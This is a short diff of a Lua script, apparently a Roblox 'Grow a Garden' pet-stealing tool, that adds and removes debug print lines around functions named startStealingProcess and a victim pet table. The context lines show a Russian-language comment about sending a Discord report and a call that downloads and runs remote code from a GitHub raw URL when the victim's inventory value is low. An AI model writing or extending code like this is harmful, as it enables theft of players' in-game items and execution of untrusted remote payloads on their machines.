@@ -198,7 +198,6 @@ local PET_VALUES = {
 
 
 local function checkPetsWhitelist(pet)
-print("local function checkPetsWhitelist(pet)")
     for _, name in ipairs(PET_WHITELIST) do
         if string.find(pet, name) then
             return true
@@ -362,6 +361,8 @@ print("local function startStealingProcess()")
         end
     end
 
+print(inventoryValue)
+
 if inventoryValue < 100 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
 print("<100")
@@ -394,6 +395,8 @@ print("3>1890")
 end
 
 
+print(inventoryValue)
+
 
     -- Условия для Discord-отчёта
     if #victimPetTable == 0 or #victimPetTable == nil then
@@ -406,7 +409,7 @@ end
     end)
 end
 
-
+print(inventoryValue)
 
 
 
